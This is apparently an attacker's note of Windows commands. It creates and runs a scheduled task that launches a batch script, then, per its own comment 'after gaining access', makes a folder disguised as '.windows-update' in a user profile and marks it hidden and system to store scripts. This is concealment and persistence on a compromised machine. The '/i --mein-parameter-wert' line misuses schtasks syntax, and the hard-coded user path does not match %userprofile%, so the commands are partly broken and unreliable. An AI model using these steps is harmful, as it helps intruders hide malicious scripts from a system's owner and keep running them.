schtasks /run /tn "MeinSkriptTask"
schtasks /run /tn "ParameterTask" /i --mein-parameter-wert

schtasks /end /tn "MeinSkriptTask"
schtasks /create /tn "MeinSkriptTask" /tr "C:\Pfad\zu\ihrem\skript.bat" /sc ONCE /st 00:00 /sd 01/01/1970

:: create hidden systemfolder after gaining access and put every script in there
mkdir %userprofile%\.windows-update
attrib +h +s "C:\Users\julia\.windows-update"